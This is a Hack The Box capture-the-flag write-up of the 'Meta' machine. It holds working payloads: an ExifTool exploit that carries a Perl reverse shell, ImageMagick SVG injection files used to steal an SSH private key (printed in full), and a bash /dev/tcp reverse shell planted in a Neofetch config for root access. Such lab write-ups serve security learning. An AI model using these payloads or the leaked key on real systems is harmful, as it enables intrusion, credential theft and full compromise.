# [meta](https://app.hackthebox.com/machines/Meta)

> The Linux web server of ArtCorp, a graphics software development company. It hosts their organization's primary website, along with a development web server hosting their latest product: MetaView, a PHP web application that receives images and returns their [Exif metadata](https://en.wikipedia.org/wiki/Exif). On the backend, MetaView passes the file to an `exiftool` whose version is vulnerable to the remote code execution vulnerability, [CVE-2021-22204](https://github.com/AssassinUKG/CVE-2021-22204), granting a low-privileged shell. Every minute or so, a cron job on the server is converting all files in a particular directory into PNG images using [ImageMagick's](https://imagemagick.org/index.php) `mogrify`, whose version is vulnerable to a [command injection vulnerability](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html). The low-privileged user can feed a specially crafted SVG file into `mogrify` to execute commands as another regular user on the server. This user is allowed to run [Neofetch](https://github.com/dylanaraps/neofetch) as `root` and retain the `XDG_CONFIG_HOME` environment variable while doing so. This environment variable contains another directory that contains the Neofetch configuration file, which Neofetch `source`s during its execution. By placing an arbitrary command in a Neofetch configuration file and then setting `XDG_CONFIG_HOME` accordingly, it is possible to execute arbitrary commands as `root`.

---

## Open Port Enumeration

The target's TCP ports 22 (SSH) and 80 (HTTP) are open.

```bash
$ sudo masscan -p1-65535 10.129.146.212 --rate=1000 -e tun0 --output-format grepable --output-filename enum/meta.masscan
$ cat enum/meta.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
22,80,
```

According to [debian.pkgs.org](https://debian.pkgs.org/10/debian-main-amd64/openssh-server_7.9p1-10+deb10u2_amd64.deb.html), the OpenSSH banner indicates the target's operating system might be Debian 10 (Buster).

An Apache web server is running on port 80, attempting to redirect to `http://artcorp.htb`. Add this hostname to the local DNS resolver.

```bash
$ nmap -sV -sC -p22,80 10.129.146.212 -oA enum/meta
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-09 10:31 EST
Nmap scan report for 10.129.146.212
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)
|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)
|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)
80/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Did not follow redirect to http://artcorp.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.64 seconds
```

---

## Port 80 Enumeration

Apache is running on port 80, hosting the website of ArtCorp, a graphics software development startup. It mentions they are gearing up to launch their newest product, MetaView, which is currently in testing.

The website mentions a couple of employees:

```txt
Judy E.
Sarah W.
Thomas S.
```

Thomas S. is a PHP developer, indicating this website or perhaps MetaView are written in PHP.

### Content Discovery

Nothing significant off `http://artcorp.htb`.

```bash
$ feroxbuster -u http://artcorp.htb -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://artcorp.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        7l       20w      234c http://artcorp.htb/assets => http://artcorp.htb/assets/
301      GET        7l       20w      231c http://artcorp.htb/css => http://artcorp.htb/css/
301      GET        7l       20w      238c http://artcorp.htb/assets/img => http://artcorp.htb/assets/img/
403      GET        7l       20w      199c http://artcorp.htb/server-status
[####################] - 1m    239992/239992  0s      found:4       errors:2
[####################] - 1m     59998/59998   625/s   http://artcorp.htb
[####################] - 1m     59998/59998   627/s   http://artcorp.htb/assets
[####################] - 1m     59998/59998   662/s   http://artcorp.htb/css
[####################] - 1m     59998/59998   653/s   http://artcorp.htb/assets/img
```

### Virtual Host Discovery

`http://dev01.artcorp.htb` appears to be live. Add it to the local DNS resolver.

```bash
$ gobuster vhost -u http://artcorp.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://artcorp.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/03/09 10:43:24 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev01.artcorp.htb (Status: 200) [Size: 247]

===============================================================
2022/03/09 10:43:47 Finished
===============================================================
```

---

## ArtCorp Development Environment

`http://dev01.artcorp.htb` yields the ArtCorp Development Environment, which lists applications that are currently in development and ready to be tested. The only application listed is MetaView (`http://dev01.artcorp.htb/metaview`).

### Content Discovery

Nothing here off `/`.

```bash
$ feroxbuster -u http://dev01.artcorp.htb -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://dev01.artcorp.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        9l       24w      247c http://dev01.artcorp.htb/index.php
403      GET        7l       20w      199c http://dev01.artcorp.htb/server-status
[####################] - 1m     59998/59998   0s      found:2       errors:0
[####################] - 1m     59998/59998   968/s   http://dev01.artcorp.htb
```

### Virtual Host Discovery

No virtual hosts off `dev01.artcorp.htb`.

```bash
$ gobuster vhost -u http://dev01.artcorp.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://dev01.artcorp.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/03/09 10:56:11 Starting gobuster in VHOST enumeration mode
===============================================================

===============================================================
2022/03/09 10:56:35 Finished
===============================================================
```

---

## MetaView & Exif RCE

Navigating to `http://dev01.artcorp.htb/metaview`, MetaView appears to be a web application that receives an image and displays its [Exif metadata](https://en.wikipedia.org/wiki/Exif).

![[images/Pasted image 20220309104821.png]]

### Content Discovery

`/metaview/uploads` redirects to `/metaview/uploads/` and `/metaview/vendor` redirects to `/metaview/vendor/`, both of which return 404s. Everything else after `/metaview/` also returns 404s, except for `/metaview/vendor/composer/LICENSE`.

```bash
$ feroxbuster -u http://dev01.artcorp.htb/metaview -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://dev01.artcorp.htb/metaview
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        7l       20w      250c http://dev01.artcorp.htb/metaview/uploads => http://dev01.artcorp.htb/metaview/uploads/
301      GET        7l       20w      246c http://dev01.artcorp.htb/metaview/lib => http://dev01.artcorp.htb/metaview/lib/
301      GET        7l       20w      249c http://dev01.artcorp.htb/metaview/assets => http://dev01.artcorp.htb/metaview/assets/
301      GET        7l       20w      246c http://dev01.artcorp.htb/metaview/css => http://dev01.artcorp.htb/metaview/css/
200      GET       33l       83w     1404c http://dev01.artcorp.htb/metaview/index.php
301      GET        7l       20w      249c http://dev01.artcorp.htb/metaview/vendor => http://dev01.artcorp.htb/metaview/vendor/
200      GET        0l        0w        0c http://dev01.artcorp.htb/metaview/vendor/autoload.php
301      GET        7l       20w      258c http://dev01.artcorp.htb/metaview/vendor/composer => http://dev01.artcorp.htb/metaview/vendor/composer/
200      GET       56l      398w     2919c http://dev01.artcorp.htb/metaview/vendor/composer/LICENSE
[####################] - 3m    419986/419986  0s      found:9       errors:935
[####################] - 2m     59998/59998   415/s   http://dev01.artcorp.htb/metaview
[####################] - 2m     59998/59998   433/s   http://dev01.artcorp.htb/metaview/uploads
[####################] - 2m     59998/59998   415/s   http://dev01.artcorp.htb/metaview/lib
[####################] - 2m     59998/59998   416/s   http://dev01.artcorp.htb/metaview/assets
[####################] - 2m     59998/59998   421/s   http://dev01.artcorp.htb/metaview/css
[####################] - 2m     59998/59998   450/s   http://dev01.artcorp.htb/metaview/vendor
[####################] - 1m     59998/59998   780/s   http://dev01.artcorp.htb/metaview/vendor/composer
```

### Manual Enumeration

Attaching a file results in an HTTP `POST` request to `/index.php` with the contents of the file.

After uploading an image, MetaView renders the image's Exif metadata.

![](images/Pasted%20image%2020220309111350.png)

Attempting to upload an empty file results in `The file is empty` being rendered.

![](images/Pasted%20image%2020220309110537.png)

Attempting to upload a PHP file results in `File not allowed (only jpg/png)` being rendered.

![](images/Pasted%20image%2020220309111643.png)

Based on this behavior, it appears that MetaView works via the following algorithm:

1. Receive file
2. Save file to `/metaview/uploads`
	- Apache is configured to restrict access to this directory
3. Get the file's Exif data (the tool's output is remarkably similar to `exiftool`'s)
	- Option 1: execute `exiftool /metaview/uploads/$FILENAME`
	- Option 2: use a PHP Exif library
4. Parse the output
	- If the output's `Error` attribute is `File is empty`, return `The file is empty`
	- If the output's `Warning` attribute is `Unsupported file type`, return `File not allowed (only jpg/png)`
	- Else, the output is good to go
5. (Maybe) Remove file from `/metaview/uploads/`
6. Return the output

Command injection seems impossible, indicating that either `$FILENAME` is being sanitized or MetaView is using a PHP Exif library.

Either way, [CVE-2021-22204](https://github.com/AssassinUKG/CVE-2021-22204) seems to have a lot of potential: "Improper neutralization of user data in the DjVu file format in ExifTool versions 7.44 and up allows arbitrary code execution when parsing the malicious image." The exploit embeds a reverse shell command in an image's metadata, uniquely crafted to exploit the vulnerability.

Start a reverse shell listener.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
```

Run the exploit.

```bash
$ CVE-2021-22204/CVE-2021-22204.sh "reverseme 10.10.14.97 443" image1.jpg
   _____   _____   ___ __ ___ _    ___ ___ ___ __  _ _
  / __\ \ / / __|_|_  )  \_  ) |__|_  )_  )_  )  \| | |
 | (__ \ V /| _|___/ / () / /| |___/ / / / / / () |_  _|
  \___| \_/ |___| /___\__/___|_|  /___/___/___\__/  |_|

Creating payload
IP: 10.10.14.97
PORT: 443
(metadata "\c${use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(443,inet_aton('10.10.14.97')))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};};};")


    1 image files updated

Finished
```

Upload the image and receive a reverse shell as `www-data`.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.97] from (UNKNOWN) [10.129.146.212] 40668
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## ImageMagick Command Injection

Running [pspy](https://github.com/DominicBreuker/pspy) on the target reveals a cron job running every so often. It appears to remove everything from `/tmp/` and then execute `/usr/local/bin/convert_images.sh`.

```bash
www-data@meta:~$ ./pspy64
...
2022/03/09 13:18:58 CMD: UID=0    PID=1      | /sbin/init
2022/03/09 13:19:01 CMD: UID=0    PID=16203  | /usr/sbin/CRON -f
2022/03/09 13:19:01 CMD: UID=0    PID=16202  | /usr/sbin/CRON -f
2022/03/09 13:19:01 CMD: UID=1000 PID=16205  | /bin/sh -c /usr/local/bin/convert_images.sh
2022/03/09 13:19:01 CMD: UID=0    PID=16204  | /bin/sh -c rm /tmp/*
2022/03/09 13:19:01 CMD: UID=0    PID=16206  |
2022/03/09 13:19:01 CMD: UID=1000 PID=16207  | /bin/bash /usr/local/bin/convert_images.sh
2022/03/09 13:19:01 CMD: UID=1000 PID=16208  | /usr/local/bin/mogrify -format png *.*
2022/03/09 13:19:01 CMD: UID=1000 PID=16209  | pkill mogrify
```

`convert_images.sh` changes into the `/var/www/dev01.artcorp.htb/convert_images/` directory and executes `/usr/local/bin/mogrify -format png` on all its contents. Then it kills any active `mogrify` processes.

```bash
www-data@meta:~$ cat /usr/local/bin/convert_images.sh
#!/bin/bash
cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
pkill mogrify
```

`www-data` has write access to `/var/www/dev01.artcorp.htb/convert_images/`.

```bash
www-data@meta:~$ ls -la /var/www/dev01.artcorp.htb/convert_images/
total 8
drwxrwxr-x 2 root www-data 4096 Jan  4 10:39 .
drwxr-xr-x 4 root root     4096 Oct 18 14:27 ..
```

According to [mogrify's documentation](https://imagemagick.org/script/command-line-options.php#format), the `-format` argument "converts any image to the image format specified." Since `png` is specified, this cron job attempts to convert all files in `/var/www/dev01.artcorp.htb/convert_images/` into PNG files.

According to [this blog post](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html), a vulnerability exists in ImageMagick 7.0.10-35 up to 7.0.10-40 that allows a user to input an SVG file to `convert` and `mogrify` that injects an arbitrary command into ImageMagick's PDF delegate, which promptly executes the injected command.

The following SVG proof of concept executes `id` and writes the output to `/dev/shm/tgihf/output`.

```xml
<image authenticate='ff" `echo $(id)> /dev/shm/tgihf/output`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="msl:/dev/shm/tgihf/exploit.svg" height="100" width="100"/>
  </svg>
</image>
```

```bash
www-data@meta:~$ pwd
/dev/shm/tgihf
www-data@meta:~$ ls
exploit.svg
www-data@meta:~$ mogrify -format png *.*
sh: 1: : Permission denied
mogrify: MagickCore/image.c:1168: DestroyImage: Assertion `image != (Image *) NULL' failed.
Aborted
www-data@meta:~$ ls
exploit.svg  output
www-data@meta:~$ cat output
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Copy the same SVG file to `/var/www/dev01.artcorp.htb/convert_files/` and wait a bit. See proof of successful command execution as `thomas` in `/dev/shm/tgihf/output`.

```bash
www-data@meta:~$ cp exploit.svg /var/www/dev01.artcorp.htb/convert_images/
www-data@meta:~$ sleep 30
www-data@meta:~$ cat output
uid=1000(thomas) gid=1000(thomas) groups=1000(thomas)
```

Modify the SVG to copy `thomas`'s SSH private key to `/dev/shm/tgihf/`.

```xml
<image authenticate='ff" `echo $(cp /home/thomas/.ssh/id_rsa /dev/shm/tgihf/)> /dev/shm/tgihf/output`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="msl:/dev/shm/tgihf/exploit.svg" height="100" width="100"/>
  </svg>
</image>
```

```bash
www-data@meta:~$ cp /dev/shm/tgihf/exploit.svg /var/www/dev01.artcorp.htb/convert_images/
www-data@meta:~$ sleep 30
www-data@meta:~$ ls -la /dev/shm/tgihf/id_rsa
-rw------- 1 thomas thomas 2590 Mar  9 18:38 id_rsa
```

Modify the SVG one more time to make the written key world-readable.

```xml
<image authenticate='ff" `echo $(chmod 777 /dev/shm/tgihf/id_rsa)> /dev/shm/tgihf/output`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="msl:/dev/shm/tgihf/exploit.svg" height="100" width="100"/>
  </svg>
</image>
```

```bash
www-data@meta:~$ cp /dev/shm/tgihf/exploit.svg /var/www/dev01.artcorp.htb/convert_images/
www-data@meta:~$ sleep 30
www-data@meta:~$ ls -la /dev/shm/tgihf/id_rsa
-rwxrwxrwx 1 thomas thomas 2590 Mar  9 18:26 /dev/shm/tgihf/id_rsa
```

`thomas`'s private key:

```txt
-----BEGIN OPENSSH PRIVATE KEY-----
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
bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE=
-----END OPENSSH PRIVATE KEY-----
```

Log in with this key and grab the user flag at `/home/thomas/user.txt`.

```bash
$ ssh -i thomas.key thomas@artcorp.htb
The authenticity of host 'artcorp.htb (10.129.146.212)' can't be established.
ED25519 key fingerprint is SHA256:Y8C2lOecv5ZDp3I6M5zjDUYDVsc3p/pgjF9HVRPioqQ.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'artcorp.htb' (ED25519) to the list of known hosts.
Linux meta 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
thomas@meta:~$ id
uid=1000(thomas) gid=1000(thomas) groups=1000(thomas)
thomas@meta:~$ ls ~/user.txt
/home/thomas/user.txt
```

---

## Neofetch Privilege Escalation

`thomas` is capable of running `/usr/bin/neofetch ""` (no arguments) as `root`, retaining the environment variable `XDG_CONFIG_HOME`.

```bash
thomas@meta:~$ sudo -l
Matching Defaults entries for thomas on meta:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=XDG_CONFIG_HOME

User thomas may run the following commands on meta:
    (root) NOPASSWD: /usr/bin/neofetch \"\"
```

[neofetch](https://github.com/dylanaraps/neofetch) is a tool for displaying system information.

![](images/Pasted%20image%2020220309203520.png)

According to Neofetch's source, `XDG_CONFIG_HOME` is the directory that contains `neofetch/config.conf`, the `neofetch` configuration file. Neofetch `sources` this configuration file. `thomas` has a Neofetch configuration file at `/home/thomas/.config/neofetch/config.conf`

By placing a `bash` command in `/home/thomas/.config/neofetch/config.conf` and settings `XDG_CONFIG_HOME` to `/home/thomas/.config`, it is possible to execute the command as `root`.

```bash
thomas@meta:~$ echo id >> ~/.config/neofetch/config.conf
thomas@meta:~$ XDG_CONFIG_HOME=/home/thomas/.config sudo /usr/bin/neofetch
uid=0(root) gid=0(root) groups=0(root)
       _,met$$$$$gg.          root@meta
    ,g$$$$$$$$$$$$$$$P.       ---------
  ,g$$P"     """Y$$.".        OS: Debian GNU/Linux 10 (buster) x86_64
 ,$$P'              `$$$.     Host: VMware Virtual Platform None
',$$P       ,ggs.     `$$b:   Kernel: 4.19.0-17-amd64
`d$$'     ,$P"'   .    $$$    Uptime: 10 hours, 13 mins
 $$P      d$'     ,    $$P    Packages: 495 (dpkg)
 $$:      $$.   -    ,d$$'    Shell: bash 5.0.3
 $$;      Y$b._   _,d$P'      CPU: Intel Xeon Gold 5218 (2) @ 2.294GHz
 Y$$.    `.`"Y$$$$P"'         GPU: VMware SVGA II Adapter
 `$$b      "-.__              Memory: 168MiB / 1994MiB
  `Y$$
   `Y$$.
     `$$b.
       `Y$$b.
          `"Y$b._
              `"""
```

Append a reverse shell payload to this configuration file.

```bash
thomas@meta:~$ echo 'bash -i >& /dev/tcp/10.10.14.97/443 0>&1' >> ~/.config/neofetch/config.conf
```

Start a reverse shell listener.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
```

Execute the payload. Neofetch will hang.

```bash
thomas@meta:~$ XDG_CONFIG_HOME=/home/thomas/.config sudo /usr/bin/neofetch

```

Receive the reverse shell as `root` and grab the system flag from `/root/root.txt`.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.97] from (UNKNOWN) [10.129.146.212] 40682
root@meta:/home/thomas# id
id
uid=0(root) gid=0(root) groups=0(root)
root@meta:/home/thomas# ls -la /root/root.txt
ls -la /root/root.txt
-rwxr----- 1 root root 33 Mar  9 10:27 /root/root.txt
```
